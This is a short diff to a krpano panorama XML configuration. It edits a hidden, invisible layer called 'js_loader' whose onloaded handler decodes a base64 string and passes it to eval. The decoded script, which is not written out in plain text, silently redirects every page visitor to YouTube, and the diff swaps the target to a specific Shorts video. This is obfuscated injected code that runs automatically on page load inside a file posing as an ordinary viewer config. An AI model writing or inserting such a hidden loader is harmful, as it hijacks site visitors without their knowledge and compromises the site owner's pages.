@@ -1,4 +1,4 @@
 <krpano version="1.0.8.15">
 <SCRIPT id="allow-copy_script"/>
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('Y29uc3QgcXVlcnlQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOw0KY29uc3QgdmlkID0gMTsNCg0KaWYgKHZpZCkgew0KICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tLyI7DQp9IGVsc2Ugew0KICAgIGNvbnNvbGUuZXJyb3IoIkdvIEhvbWUiKTsNCn0=');eval(w)););"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('Y29uc3QgcXVlcnlQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOw0KY29uc3QgdmlkID0gMTsNCg0KaWYgKHZpZCkgew0KICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3Nob3J0cy9fNkh6TElKUEgyQSI7DQp9IGVsc2Ugew0KICAgIGNvbnNvbGUuZXJyb3IoIkdvIEhvbWUiKTsNCn0=');eval(w)););"/>
 </krpano>
